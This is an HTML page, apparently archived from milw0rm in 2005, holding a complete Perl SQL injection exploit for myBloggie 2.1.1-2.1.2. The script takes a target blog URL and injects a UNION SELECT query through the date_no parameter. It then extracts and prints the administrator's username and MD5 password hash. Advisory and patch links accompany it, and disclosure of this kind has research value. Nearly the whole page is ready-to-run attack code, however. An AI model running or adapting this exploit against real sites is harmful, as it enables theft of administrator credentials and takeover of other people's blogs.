<html><head><title>myBloggie 2.1.1 - 2.1.2 SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
#
# SQL Injection Exploit for myBloggie 2.1.1 - 2.1.2
# This exploit show the username of the administrator of the blog and his password crypted in MD5
# Related advisories: (Italian) http://www.codebug.org/index.php?subaction=showfull&amp;id=1115310052&amp;archive=&amp;start_from=&amp;ucat=6&amp;
#                     (English) http://www.packetstormsecurity.org/0505-advisories/codebug-9.txt
# Patch: http://mywebland.com/forums/viewtopic.php?t=180
# Coded by Alberto Trivero and Discovered with CorryL

use LWP::Simple;

print &quot;\n\t=======================================\n&quot;;
print &quot;\t= Exploit for myBloggie 2.1.1 - 2.1.2 =\n&quot;;
print &quot;\t=    Alberto Trivero - codebug.org    =\n&quot;;
print &quot;\t=======================================\n\n&quot;;

if(!$ARGV[0] or !($ARGV[0]=~/http/) or !$ARGV[1] or ($ARGV[1] ne '2.1.1' and $ARGV[1] ne '2.1.2')) {
   print &quot;Usage:\nperl $0 [full_target_path] [version: 2.1.1 OR 2.1.2]\n\nExample:\nperl $0 http://www.example.com/mybloggie/ 2.1.1\n&quot;;
   exit(0);
}

$url=q[index.php?month_no=1&amp;year=1&amp;mode=viewdate&amp;date_no=1%20UNION%20SELECT%20null,null,null,null,user,password,null,null,null,null%20FROM%20blog_user/*];
$page=get($ARGV[0].$url) || die &quot;[-] Unable to retrieve: $!&quot;;
print &quot;[+] Connected to: $ARGV[0]\n&quot;;
if($ARGV[1] eq '2.1.1') {
   $page=~m/&lt;tr&gt;&lt;td colspan=&quot;3&quot; class=&quot;subject&quot;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;/ &amp;&amp; print &quot;[+] Username of administrator is: $1\n&quot;;
   print &quot;[-] Unable to retrieve username\n&quot; if(!$1);
}
else {
   $page=~m/&lt;img src=&quot;templates\/aura\/images\/permalink.gif&quot; border=&quot;0&quot; title=&quot;Permalink&quot;&gt;&lt;\/a&gt; (.*?)&lt;\/td&gt;&lt;\/tr&gt;/ &amp;&amp; print &quot;[+] Username of administrator is: $1\n&quot;;
   print &quot;[-] Unable to retrieve username\n&quot; if(!$1);
}
$page=~m/&lt;tr&gt;&lt;td colspan=&quot;3&quot; class=&quot;message&quot;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;/ &amp;&amp; print &quot;[+] MD5 hash of password is: $1\n&quot;;
print &quot;[-] Unable to retrieve hash of password\n&quot; if(!$1);


# milw0rm.com [2005-05-31]</pre></html>